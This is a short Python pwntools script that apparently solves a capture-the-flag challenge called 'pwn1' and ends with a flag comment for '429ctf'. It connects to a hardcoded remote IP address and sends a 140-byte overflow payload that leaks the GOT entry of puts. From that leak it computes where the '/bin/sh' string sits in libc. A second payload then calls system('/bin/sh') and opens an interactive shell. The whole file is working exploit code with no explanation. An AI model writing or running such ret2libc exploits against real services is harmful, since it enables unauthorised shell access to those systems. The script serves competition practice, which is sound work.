#!/usr/bin/env python
from pwn import *
from struct import pack
context(arch='i386', os='linux', log_level='debug')

libc = ELF('libc.so')
elf = ELF('pwn1')

# pr = process('./pwn1') 
pr = remote('120.27.144.177', 8000)
# pr = remote('114.55.7.125', 8000)

plt_puts = elf.symbols['puts']
print 'plt_puts= ' + hex(plt_puts)
got_puts = elf.got['puts']
print 'got_puts= ' + hex(got_puts)
vulfun_addr = 0x08048656
print 'vulfun= ' + hex(vulfun_addr)

sysaddr = 0x080484B0

p = 'A' * 140  + p32(plt_puts) + p32(vulfun_addr) + p32(got_puts)
pr.recvuntil('input your name:')
pr.sendline(p)
pr.recvuntil(':')
pr.sendline('1') 
pr.recvuntil('\n')
puts_addr = u32(pr.recv(4))
print 'puts_addr=' + hex(puts_addr)

binsh_addr = puts_addr - (libc.symbols['puts'] - next(libc.search('/bin/sh')))
print 'binsh_addr= ' + hex(binsh_addr)
p2 = 'A' * 140 + p32(sysaddr) +  p32(vulfun_addr) + p32(binsh_addr)
pr.recvuntil('input your name:')
pr.sendline(p2)
pr.recvuntil(':')
pr.sendline('1') 
pr.interactive() 

# FLAG{welc0me_t0_th3_429ctf}